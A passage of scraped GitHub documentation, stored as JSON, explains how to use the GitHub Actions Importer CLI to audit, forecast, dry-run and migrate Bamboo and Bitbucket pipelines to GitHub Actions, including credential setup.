        "text": "Theauditcommand performs the following steps:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the projects defined in a Bamboo organization.",
          "Converts each pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit of a Bamboo instance, run the following command in your terminal:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit bamboo --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecasting usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Bamboo instance."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast bamboo --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Forecasting a project"
      },
      {
        "type": "paragraph",
        "text": "To limit the forecast to the plans and deployments environments associated with a project, you can use the--projectoption, where the value is set to a build project key."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast bamboo --project PAN --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Queue timemetrics describe the amount of time a job spent waiting for a runner to be available to execute it.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time. This metric can be used to"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a dry-run migration of a Bamboo pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use thedry-runcommand to convert a Bamboo pipeline to an equivalent GitHub Actions workflow. A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running a dry-run migration for a build plan"
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Bamboo build plan to GitHub Actions, run the following command in your terminal, replacing:my_plan_slugwith the plan's project and plan key in the format<projectKey>-<planKey>(for example:PAN-SCRIP)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bamboo build --plan-slug :my_plan_slug --output-dir tmp/dry-run"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running a dry-run migration for a deployment project"
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating your Bamboo deployment project to GitHub Actions, run the following command in your terminal, replacing:my_deployment_project_idwith the ID of the deployment project you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bamboo deployment --deployment-project-id :my_deployment_project_id --output-dir tmp/dry-run"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform a production migration of a Bamboo pipeline"
      },
      {
        "type": "paragraph",
        "text": "You can use themigratecommand to convert a Bamboo pipeline and open a pull request with the equivalent GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command for a build plan"
      },
      {
        "type": "paragraph",
        "text": "To migrate a Bamboo build plan to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, and:my_plan_slugwith the plan's project and plan key in the format<projectKey>-<planKey>."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate bamboo build --plan-slug :my_plan_slug --target-url :target_url --output-dir tmp/migrate"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate bamboo build --plan-slug :PROJECTKEY-PLANKEY --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2022-08-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20220916-014033.log'\n[2022-08-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the migrate command for a deployment project"
      },
      {
        "type": "paragraph",
        "text": "To migrate a Bamboo deployment project to GitHub Actions, run the following command in your terminal, replacing thetarget-urlvalue with the URL for your GitHub repository, and:my_deployment_project_idwith the ID of the deployment project you are converting."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer migrate bamboo deployment --deployment-project-id :my_deployment_project_id --target-url :target_url --output-dir tmp/migrate"
      },
      {
        "type": "paragraph",
        "text": "The command's output includes the URL to the pull request that adds the converted workflow to your repository. An example of a successful output is similar to the following:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "$ gh actions-importer migrate bamboo deployment --deployment-project-id 123 --target-url https://github.com/octo-org/octo-repo --output-dir tmp/migrate\n[2023-04-20 22:08:20] Logs: 'tmp/migrate/log/actions-importer-20230420-014033.log'\n[2023-04-20 22:08:20] Pull request: 'https://github.com/octo-org/octo-repo/pull/1'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the pull request"
      },
      {
        "type": "paragraph",
        "text": "The output from a successful run of themigratecommand contains a link to the new pull request that adds the converted workflow to your repository."
      },
      {
        "type": "paragraph",
        "text": "Some important elements of the pull request include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "In the pull request description, a section calledManual steps, which lists steps that you must manually complete before you can finish migrating your pipelines to GitHub Actions. For example, this section might tell you to create any secrets used in your workflows.",
          "The converted workflows file. Select theFiles changedtab in the pull request to view the workflow file that will be added to your GitHub repository."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you are finished inspecting the pull request, you can merge it to add the workflow to your GitHub repository."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Reference"
      },
      {
        "type": "paragraph",
        "text": "This section contains reference information on environment variables, optional arguments, and supported syntax when using GitHub Actions Importer to migrate from Bamboo."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using environment variables"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses environment variables for its authentication configuration. These variables are set when following the configuration process using theconfigurecommand. For more information, see theConfiguring credentialssection."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the following environment variables to connect to your Bamboo instance:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "GITHUB_ACCESS_TOKEN: The personal access token (classic) used to create pull requests with a converted workflow (requiresrepoandworkflowscopes).",
          "GITHUB_INSTANCE_URL: The URL to the target GitHub instance (for example,https://github.com).",
          "BAMBOO_ACCESS_TOKEN: The Bamboo personal access token used to authenticate with your Bamboo instance.",
          "BAMBOO_INSTANCE_URL: The URL to the Bamboo instance (for example,https://bamboo.example.com)."
        ]
      },
      {
        "type": "paragraph",
        "text": "These environment variables can be specified in a.env.localfile that is loaded by GitHub Actions Importer when it is run."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Optional arguments"
      },
      {
        "type": "paragraph",
        "text": "There are optional arguments you can use with the GitHub Actions Importer subcommands to customize your migration."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--source-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--source-file-pathargument with thedry-runormigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from the Bamboo instance. The--source-file-pathargument tells GitHub Actions Importer to use the specified source file path instead."
      },
      {
        "type": "paragraph",
        "text": "For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --source-file-path ./path/to/my/bamboo/file.yml"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "--config-file-path"
      },
      {
        "type": "paragraph",
        "text": "You can use the--config-file-pathargument with theaudit,dry-run, andmigratesubcommands."
      },
      {
        "type": "paragraph",
        "text": "By default, GitHub Actions Importer fetches pipeline contents from the Bamboo instance. The--config-file-pathargument tells GitHub Actions Importer to use the specified source files instead."
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Audit example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file to perform an audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit bamboo -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\""
      },
      {
        "type": "paragraph",
        "text": "To audit a Bamboo instance using a config file, the config file must be in the following format, and eachrepository_slugmust be unique:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "source_files:\n  - repository_slug: IN/COM\n    path: path/to/one/source/file.yml\n  - repository_slug: IN/JOB\n    path: path/to/another/source/file.yml"
      },
      {
        "type": "heading",
        "level": 5,
        "text": "Dry run example"
      },
      {
        "type": "paragraph",
        "text": "In this example, GitHub Actions Importer uses the specified YAML configuration file as the source file to perform a dry run."
      },
      {
        "type": "paragraph",
        "text": "The repository slug is built using the--plan-slugoption. The source file path is matched and pulled from the specified source file."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bamboo build --plan-slug IN-COM -o tmp/bamboo --config-file-path \"./path/to/my/bamboo/config.yml\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Supported syntax for Bamboo pipelines"
      },
      {
        "type": "paragraph",
        "text": "The following table shows the type of properties that GitHub Actions Importer is currently able to convert."
      },
      {
        "type": "paragraph",
        "text": "For more information about supported Bamboo concept and plugin mappings, see thegithub/gh-actions-importerrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Environment variable mapping"
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions Importer uses the mapping in the table below to convert default Bamboo environment variables to the closest equivalent in GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Unknown variables are transformed to${{ env.<variableName> }}and must be replaced or added underenvfor proper operation. For example,${bamboo.jira.baseUrl}will become${{ env.jira_baseUrl }}."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "System Variables"
      },
      {
        "type": "paragraph",
        "text": "System variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example,${system.<variable.name>}will be transformed to$variable_name. We recommend you verify this to ensure proper operation of the workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Legal notice"
      },
      {
        "type": "paragraph",
        "text": "Portions have been adapted fromhttps://github.com/github/gh-actions-importer/under the MIT license:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "MIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer",
    "content": [
      {
        "type": "paragraph",
        "text": "Legal notice"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About migrating from Bitbucket Pipelines with GitHub Actions Importer"
      },
      {
        "type": "paragraph",
        "text": "The instructions below will guide you through configuring your environment to use GitHub Actions Importer to migrate Bitbucket Pipelines to GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Prerequisites"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "An environment where you can run Linux-based containers, and can install the necessary tools.Docker isinstalledand running.GitHub CLIis installed.NoteThe GitHub Actions Importer container and CLI do not need to be installed on the same server as your CI platform.",
          "Docker isinstalledand running.",
          "GitHub CLIis installed."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Limitations"
      },
      {
        "type": "paragraph",
        "text": "There are some limitations when migrating from Bitbucket Pipelines to GitHub Actions with GitHub Actions Importer."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Images in a private AWS ECR are not supported.",
          "The Bitbucket Pipelines optionsizeis not supported. If additional runner resources are required in GitHub Actions, consider using larger runners. For more information, seeUsing larger runners.",
          "Metrics detailing the queue time of jobs is not supported by theforecastcommand.",
          "Bitbucketafter-scriptsare supported using GitHub Actionsalways()in combination with checking thesteps.<step_id>.conclusionof the previous step. For more information, seeAccessing contextual information about workflow runs.The following is an example of using thealways()withsteps.<step_id>.conclusion.-name:AfterScript1run:|-\n      echo \"I'm after the script ran!\"\n      echo \"We should be grouped!\"id:after-script-1if:\"${{ always() }}\"-name:AfterScript2run:|-\n      echo \"this is really the end\"\n      echo \"goodbye, for now!\"id:after-script-2if:\"${{ steps.after-script-1.conclusion == 'success' && always() }}\""
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "Certain Bitbucket Pipelines constructs must be migrated manually. These include:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Secured repository, workspace, and deployment variables",
          "SSH keys"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing the GitHub Actions Importer CLI extension"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Install the GitHub Actions Importer CLI extension:Bashgh extension install github/gh-actions-importergh extension install github/gh-actions-importer",
          "Verify that the extension is installed:$ gh actions-importer -h\nOptions:\n  -?, -h, --helpShowhelpand usage information\n\nCommands:\n  update     Update to the latest version of GitHub Actions Importer.\n  version    Display the version of GitHub Actions Importer.\n  configure  Start an interactive prompt to configure credentials used to authenticate with your CI server(s).\n  audit      Plan your CI/CD migration by analyzing your current CI/CD footprint.\n  forecast   Forecast GitHub Actions usage from historical pipeline utilization.\n  dry-run    Convert a pipeline to a GitHub Actions workflow and output its yaml file.\n  migrate    Convert a pipeline to a GitHub Actions workflow and open a pull request with the changes."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring credentials"
      },
      {
        "type": "paragraph",
        "text": "TheconfigureCLI command is used to set required credentials and options for GitHub Actions Importer when working with Bitbucket Pipelines and GitHub."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Create a GitHub personal access token (classic). For more information, seeManaging your personal access tokens.Your token must have theworkflowscope.After creating the token, copy it and save it in a safe location for later use.",
          "Create a Workspace Access Token for Bitbucket Pipelines. For more information, seeWorkspace Access Token permissionsin the Bitbucket documentation. Your token must have thereadscope for pipelines, projects, and repositories.",
          "In your terminal, run the GitHub Actions ImporterconfigureCLI command:gh actions-importer configureTheconfigurecommand will prompt you for the following information:For \"Which CI providers are you configuring?\", use the arrow keys to selectBitbucket, pressSpaceto select it, then pressEnter.For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).For \"Personal access token for Bitbucket\", enter the Workspace Access Token that you created earlier, and pressEnter.For \"Base url of the Bitbucket instance\", enter the URL for your Bitbucket instance, and pressEnter.An example of theconfigurecommand is shown below:$gh actions-importer configure✔ Which CI providers are you configuring?: Bitbucket\nEnter the following values (leave empty to omit):\n✔ Personal access token for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ Personal access token for Bitbucket: ********************\n✔ Base url of the Bitbucket instance: https://bitbucket.example.com\nEnvironment variables successfully updated.",
          "For \"Which CI providers are you configuring?\", use the arrow keys to selectBitbucket, pressSpaceto select it, then pressEnter.",
          "For \"Personal access token for GitHub\", enter the value of the personal access token (classic) that you created earlier, and pressEnter.",
          "For \"Base url of the GitHub instance\", pressEnterto accept the default value (https://github.com).",
          "For \"Personal access token for Bitbucket\", enter the Workspace Access Token that you created earlier, and pressEnter.",
          "For \"Base url of the Bitbucket instance\", enter the URL for your Bitbucket instance, and pressEnter.",
          "In your terminal, run the GitHub Actions ImporterupdateCLI command to connect to GitHub Packages Container registry and ensure that the container image is updated to the latest version:gh actions-importer updateThe output of the command should be similar to below:Updating ghcr.io/actions-importer/cli:latest...\nghcr.io/actions-importer/cli:latest up-to-date"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Perform an audit of the Bitbucket instance"
      },
      {
        "type": "paragraph",
        "text": "You can use the audit command to get a high-level view of pipelines in a Bitbucket instance."
      },
      {
        "type": "paragraph",
        "text": "The audit command performs the following steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Fetches all of the pipelines for a workspace.",
          "Converts pipeline to its equivalent GitHub Actions workflow.",
          "Generates a report that summarizes how complete and complex of a migration is possible with GitHub Actions Importer."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the audit command"
      },
      {
        "type": "paragraph",
        "text": "To perform an audit run the following command in your terminal, replacing:workspacewith the name of the Bitbucket workspace to audit."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit bitbucket --workspace :workspace --output-dir tmp/audit"
      },
      {
        "type": "paragraph",
        "text": "Optionally, a--project-keyoption can be provided to the audit command to limit the results to only pipelines associated with a project."
      },
      {
        "type": "paragraph",
        "text": "In the below example command:project_keyshould be replaced with the key of the project that should be audited. Project keys can be found in Bitbucket on the workspace projects page."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer audit bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/audit"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the audit results"
      },
      {
        "type": "paragraph",
        "text": "The files in the specified output directory contain the results of the audit. See theaudit_summary.mdfile for a summary of the audit results."
      },
      {
        "type": "paragraph",
        "text": "The audit summary has the following sections."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pipelines"
      },
      {
        "type": "paragraph",
        "text": "The \"Pipelines\" section contains a high-level statistics regarding the conversion rate done by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Pipelines\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Successfulpipelines had 100% of the pipeline constructs and individual items converted automatically to their GitHub Actions equivalent.",
          "Partially successfulpipelines had all of the pipeline constructs converted, however, there were some individual items that were not converted automatically to their GitHub Actions equivalent.",
          "Unsupportedpipelines are definition types that are not supported by GitHub Actions Importer.",
          "Failedpipelines encountered a fatal error when being converted. This can occur for one of three reasons:The pipeline was originally misconfigured and not valid.GitHub Actions Importer encountered an internal error when converting it.There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials.",
          "The pipeline was originally misconfigured and not valid.",
          "GitHub Actions Importer encountered an internal error when converting it.",
          "There was an unsuccessful network response that caused the pipeline to be inaccessible, which is often due to invalid credentials."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Build steps"
      },
      {
        "type": "paragraph",
        "text": "The \"Build steps\" section contains an overview of individual build steps that are used across all pipelines, and how many were automatically converted by GitHub Actions Importer."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Build steps\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Aknownbuild step is a step that was automatically converted to an equivalent action.",
          "Anunknownbuild step is a step that was not automatically converted to an equivalent action.",
          "Anunsupportedbuild step is a step that is either:Fundamentally not supported by GitHub Actions.Configured in a way that is incompatible with GitHub Actions.",
          "Fundamentally not supported by GitHub Actions.",
          "Configured in a way that is incompatible with GitHub Actions.",
          "Anactionis a list of the actions that were used in the converted workflows. This can be important for:If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review.",
          "If you use GitHub Enterprise Server, gathering the list of actions to sync to your instance.",
          "Defining an organization-level allowlist of actions that are used. This list of actions is a comprehensive list of actions that your security or compliance teams may need to review."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Manual tasks"
      },
      {
        "type": "paragraph",
        "text": "The \"Manual tasks\" section contains an overview of tasks that GitHub Actions Importer is not able to complete automatically, and that you must complete manually."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the \"Manual tasks\" section:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Asecretis a repository or organization-level secret that is used in the converted pipelines. These secrets must be created manually in GitHub Actions for these pipelines to function properly. For more information, seeUsing secrets in GitHub Actions.",
          "Aself-hosted runnerrefers to a label of a runner that is referenced in a converted pipeline that is not a GitHub-hosted runner. You will need to manually define these runners for these pipelines to function properly."
        ]
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Files"
      },
      {
        "type": "paragraph",
        "text": "The final section of the audit report provides a manifest of all the files that were written to disk during the audit."
      },
      {
        "type": "paragraph",
        "text": "Each pipeline file has a variety of files included in the audit, including:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The original pipeline as it was defined in GitHub.",
          "Any network responses used to convert the pipeline.",
          "The converted workflow file.",
          "Stack traces that can be used to troubleshoot a failed pipeline conversion."
        ]
      },
      {
        "type": "paragraph",
        "text": "Additionally, theworkflow_usage.csvfile contains a comma-separated list of all actions, secrets, and runners that are used by each successfully converted pipeline. This can be useful for determining which workflows use which actions, secrets, or runners, and can be useful for performing security reviews."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Forecasting usage"
      },
      {
        "type": "paragraph",
        "text": "You can use theforecastcommand to forecast potential GitHub Actions usage by computing metrics from completed pipeline runs in your Bitbucket instance."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the forecast command"
      },
      {
        "type": "paragraph",
        "text": "To perform a forecast of potential GitHub Actions usage, run the following command in your terminal, replacing:workspacewith the name of the Bitbucket workspace to forecast. By default, GitHub Actions Importer includes the previous seven days in the forecast report."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast bitbucket --workspace :workspace --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Forecasting a project"
      },
      {
        "type": "paragraph",
        "text": "To limit the forecast to a project, you can use the--project-keyoption. Replace the value for the:project_keywith the project key for the project to forecast."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer forecast bitbucket --workspace :workspace --project-key :project_key --output-dir tmp/forecast_reports"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the forecast report"
      },
      {
        "type": "paragraph",
        "text": "Theforecast_report.mdfile in the specified output directory contains the results of the forecast."
      },
      {
        "type": "paragraph",
        "text": "Listed below are some key terms that can appear in the forecast report:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Thejob countis the total number of completed jobs.",
          "Thepipeline countis the number of unique pipelines used.",
          "Execution timedescribes the amount of time a runner spent on a job. This metric can be used to help plan for the cost of GitHub-hosted runners.This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "This metric is correlated to how much you should expect to spend in GitHub Actions. This will vary depending on the hardware used for these minutes. You can use theGitHub Actions pricing calculatorto estimate the costs.",
          "Concurrent jobsmetrics describe the amount of jobs running at any given time."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Performing a dry-run migration"
      },
      {
        "type": "paragraph",
        "text": "You can use the dry-run command to convert a Bitbucket pipeline to an equivalent GitHub Actions workflow(s). A dry-run creates the output files in a specified directory, but does not open a pull request to migrate the pipeline."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running the dry-run command"
      },
      {
        "type": "paragraph",
        "text": "To perform a dry run of migrating a Bitbucket pipeline to GitHub Actions, run the following command in your terminal, replacing:workspacewith the name of the workspace and:repowith the name of the repository in Bitbucket."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh actions-importer dry-run bitbucket --workspace :workspace --repository :repo --output-dir tmp/dry-run"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Inspecting the converted workflows"
      },
      {
        "type": "paragraph",
        "text": "You can view the logs of the dry run and the converted workflow files in the specified output directory."
      },
      {
        "type": "paragraph",
        "text": "If there is anything that GitHub Actions Importer was not able to convert automatically, such as unknown build steps or a partially successful pipeline, you might want to create custom transformers to further customize the conversion process. For more information, seeExtending GitHub Actions Importer with custom transformers."
      },
      {
